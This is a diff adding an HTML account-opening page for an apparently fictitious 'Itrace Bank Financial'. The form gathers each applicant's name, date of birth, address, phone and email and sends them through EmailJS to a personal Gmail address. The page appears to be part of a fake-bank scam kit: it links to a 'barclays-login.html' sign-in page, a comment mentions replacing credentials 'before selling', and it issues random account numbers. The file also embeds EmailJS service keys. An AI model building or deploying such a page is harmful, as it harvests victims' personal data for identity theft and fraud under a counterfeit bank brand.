@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Open an Account — Itrace Bank Financial</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="itrace-theme.css"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',Arial,sans-serif;background:#F4F7FD;color:#1a1a2e;min-height:100vh}
+.top{background:#00195A;height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem}
+.brand{display:flex;align-items:center;gap:.65rem;color:#fff;text-decoration:none}
+.brand-ic{width:36px;height:36px;border-radius:9px;overflow:hidden}
+.brand-ic img{width:100%;height:100%;display:block}
+.brand b{font-size:.95rem}.brand small{display:block;font-size:.6rem;opacity:.55}
+.top a.signin{color:#fff;font-size:.82rem;text-decoration:none;border:1px solid rgba(255,255,255,.3);padding:.4rem .9rem;border-radius:8px}
+.wrap{max-width:640px;margin:2rem auto;padding:0 1rem}
+h1{font-size:1.5rem;font-weight:900;color:#00195A;margin-bottom:.35rem}
+.lead{font-size:.86rem;color:#6B7280;margin-bottom:1.5rem;line-height:1.6}
+.card{background:#fff;border:1px solid #E3EAF7;border-radius:18px;padding:1.5rem;box-shadow:0 10px 30px rgba(0,25,90,.06)}
+.card h3{font-size:.9rem;font-weight:800;color:#00195A;margin:.5rem 0 .8rem}
+.card h3:first-child{margin-top:0}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:.85rem}
+.fg{margin-bottom:.9rem}
+.fg label{display:block;font-size:.66rem;font-weight:700;color:#00195A;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.33rem}
+.fg input,.fg select{width:100%;padding:.72rem .9rem;border:2px solid #E3EAF7;border-radius:12px;font-size:.88rem;font-family:inherit;outline:none;background:#fff}
+.fg input:focus,.fg select:focus{border-color:#003087;box-shadow:0 0 0 4px rgba(11,91,211,.12)}
+.hint{font-size:.7rem;color:#6B7280;margin-top:.3rem}
+.check{display:flex;gap:.6rem;align-items:flex-start;font-size:.8rem;color:#374151;line-height:1.5;margin-bottom:.9rem}
+.check input{margin-top:.2rem}
+.btn{width:100%;padding:.95rem;background:linear-gradient(135deg,#003087,#0B5BD3);color:#fff;border:none;border-radius:12px;font-size:.95rem;font-weight:800;cursor:pointer;font-family:inherit;box-shadow:0 8px 22px rgba(0,48,135,.25)}
+.btn:disabled{opacity:.6;cursor:wait}
+#sub-status{display:none;margin-top:.9rem;padding:.85rem;border-radius:10px;font-size:.88rem;line-height:1.5}
+.ok{display:none;text-align:center;padding:1rem 0}
+.ok .tick{width:64px;height:64px;border-radius:50%;background:#ECFDF5;color:#065F46;font-size:2rem;display:flex;align-items:center;justify-content:center;margin:0 auto 1rem}
+.ok h2{font-size:1.25rem;font-weight:900;color:#00195A;margin-bottom:.5rem}
+.ok p{font-size:.86rem;color:#6B7280;line-height:1.6;margin-bottom:.6rem}
+.refbox{background:#F4F7FD;border:1px dashed #C7D7F5;border-radius:10px;padding:.9rem;margin:1rem 0;font-size:.82rem;color:#00195A}
+.refbox b{font-size:1rem;letter-spacing:.05em}
+@media(max-width:600px){.row{grid-template-columns:1fr}}
+</style>
+<link rel="manifest" href="manifest.json"/>
+<meta name="theme-color" content="#00195A"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-title" content="Itrace Bank"/>
+<link rel="apple-touch-icon" href="apple-touch-icon.png"/>
+<script>if('serviceWorker' in navigator){ navigator.serviceWorker.register('sw.js'); }</script>
+</head>
+<body>
+
+<div class="top">
+  <a class="brand" href="index.html">
+    <div class="brand-ic"><img src="itrace-logo.svg" alt="Itrace Bank logo"/></div>
+    <div><b>Itrace Bank Financial</b><small>Digital-First Banking</small></div>
+  </a>
+  <a class="signin" href="barclays-login.html">Sign In</a>
+</div>
+
+<div class="wrap">
+  <div id="formView">
+    <h1>Open a Free Account</h1>
+    <p class="lead">Takes about five minutes. No branch visit and no monthly fees. Fill in your details and we will review your application.</p>
+
+    <form class="card" id="signupForm" novalidate>
+      <h3>1. Personal details</h3>
+      <div class="row">
+        <div class="fg"><label for="fn">First name</label><input id="fn" required/></div>
+        <div class="fg"><label for="ln">Last name</label><input id="ln" required/></div>
+      </div>
+      <div class="row">
+        <div class="fg"><label for="em">Email</label><input type="email" id="em" required/></div>
+        <div class="fg"><label for="ph">Phone</label><input type="tel" id="ph" placeholder="+1 555 000 0000" required/></div>
+      </div>
+      <div class="row">
+        <div class="fg"><label for="dob">Date of birth</label><input type="date" id="dob" required/></div>
+        <div class="fg"><label for="ctry">Country</label>
+          <select id="ctry"><option>United States</option><option>United Kingdom</option><option>Canada</option><option>Nigeria</option><option>Ghana</option><option>Other</option></select>
+        </div>
+      </div>
+      <div class="fg"><label for="addr">Home address</label><input id="addr" placeholder="Street, city, state, postcode" required/></div>
+
+      <h3>2. Account</h3>
+      <div class="fg"><label for="acctype">Account type</label>
+        <select id="acctype">
+          <option value="HYSA">High-Yield Savings (HYSA)</option>
+          <option value="CD">Certificate of Deposit (CD)</option>
+        </select>
+      </div>
+      <div class="fg"><label for="dep">Opening deposit ($)</label><input type="number" id="dep" min="100" step="0.01" placeholder="100.00" required/>
+        <div class="hint">Minimum $100 for savings. CDs need at least $1,000.</div>
+      </div>
+
+      <label class="check"><input type="checkbox" id="agree"/> I confirm the information is correct and I agree to the Itrace Bank Financial account terms.</label>
+      <button class="btn" type="submit" id="submitBtn">Submit Application</button>
+      <div id="sub-status"></div>
+    </form>
+  </div>
+
+  <div class="card ok" id="okView">
+    <div class="tick">✓</div>
+    <h2>Application Received</h2>
+    <p>Thank you, <b id="okName"></b>. Your application is now with our team for review.</p>
+    <div class="refbox">Application reference<br/><b id="okRef"></b><br/><br/>Your account number<br/><b id="okAcc"></b></div>
+    <p>Our team reviews applications during working hours: Monday to Friday, 9:00 AM to 5:00 PM (GMT).</p>
+    <p>Keep these numbers safe. Once your account is approved, you can sign in with your account number.</p>
+    <a href="barclays-login.html" style="color:#003087;font-weight:700;text-decoration:none">Go to Sign In →</a>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="module">
+import * as DB from './bank-db.js';
+
+// Email service (EmailJS). Replace with your own Itrace EmailJS details before selling.
+const MAIL = { service: 'service_kc6a9zs', template: 'template_usgv766', key: '_t9_AQLiLfTZLvOhw' };
+try{ window.emailjs.init(MAIL.key); }catch(e){}
+const BANK_HEADER = 'ITRACE BANK FINANCIAL\n27 Gresham Street, London, EC2V 7HN, United Kingdom\nEmail: bankitrace@gmail.com\nWorking hours: Monday to Friday, 9:00 AM to 5:00 PM (GMT)\n' + '────────────────────────────────\n\n';
+
+
+const form = document.getElementById('signupForm');
+const btn = document.getElementById('submitBtn');
+const box = document.getElementById('sub-status');
+
+function show(kind, text){
+  box.style.display = 'block';
+  if(kind === 'error'){
+    box.style.background = '#FEF2F2'; box.style.border = '1px solid #FECACA'; box.style.color = '#B91C1C';
+  }else{
+    box.style.background = '#EEF3FC'; box.style.border = '1px solid #C7D7F5'; box.style.color = '#003087';
+  }
+  box.textContent = text;
+  box.scrollIntoView({behavior:'smooth', block:'center'});
+}
+
+form.addEventListener('submit', async (ev) => {
+  ev.preventDefault();
+  const v = id => document.getElementById(id).value.trim();
+  const fn = v('fn'), ln = v('ln'), em = v('em'), ph = v('ph'), dob = v('dob'), addr = v('addr');
+  const dep = parseFloat(document.getElementById('dep').value);
+  const type = v('acctype');
+
+  if(!fn || !ln || !em || !ph || !dob || !addr){ return show('error', 'Please fill in all personal details.'); }
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)){ return show('error', 'Please enter a valid email address.'); }
+  const age = (Date.now() - new Date(dob).getTime()) / (365.25*24*3600*1000);
+  if(age < 18){ return show('error', 'You must be at least 18 years old to open an account.'); }
+  if(!dep || isNaN(dep)){ return show('error', 'Please enter your opening deposit.'); }
+  if(type === 'CD' && dep < 1000){ return show('error', 'A Certificate of Deposit needs at least $1,000.'); }
+  if(type === 'HYSA' && dep < 100){ return show('error', 'A High-Yield Savings account needs at least $100.'); }
+  if(!document.getElementById('agree').checked){ return show('error', 'Please tick the box to agree to the account terms.'); }
+
+  const ref = 'APP' + Math.floor(100000 + Math.random()*900000);
+  const acc = 'BUS-' + Math.floor(10000000 + Math.random()*90000000);
+  const app = {
+    ref: ref, accNum: acc, status: 'Pending',
+    name: fn + ' ' + ln, email: em, phone: ph, dob: dob, address: addr,
+    country: v('ctry'), accountType: type, openingDeposit: dep,
+    submitted: new Date().toISOString()
+  };
+
+  btn.disabled = true;
+  show('info', 'Sending your application...');
+  try{
+    await DB.submitApplication(app);
+  }catch(e){
+    btn.disabled = false;
+    return show('error', 'We could not send your application. ' + (e.code || e.message || '') + ' Please try again.');
+  }
+
+  try{
+    await window.emailjs.send(MAIL.service, MAIL.template, {
+      to_email: 'bankitrace@gmail.com',
+      customer_name: app.name,
+      alert_type: '🆕 New account application',
+      message: BANK_HEADER + 'Application ' + ref + '\nName: ' + app.name + '\nEmail: ' + em + '\nPhone: ' + ph
+             + '\nDate of birth: ' + dob + '\nAddress: ' + addr + '\nCountry: ' + app.country
+             + '\nAccount type: ' + type + '\nOpening deposit: $' + dep
+             + '\nAccount number: ' + acc + '\n\nReview it in the admin Applications tab.',
+      account_number: acc,
+      time: new Date().toLocaleString('en-US')
+    });
+  }catch(e){ console.error('Bank notification email failed', e); }
+
+  document.getElementById('okName').textContent = fn;
+  document.getElementById('okRef').textContent = ref;
+  document.getElementById('okAcc').textContent = acc;
+  document.getElementById('formView').style.display = 'none';
+  document.getElementById('okView').style.display = 'block';
+  window.scrollTo({top:0, behavior:'smooth'});
+});
+</script>
+</body>
+</html>
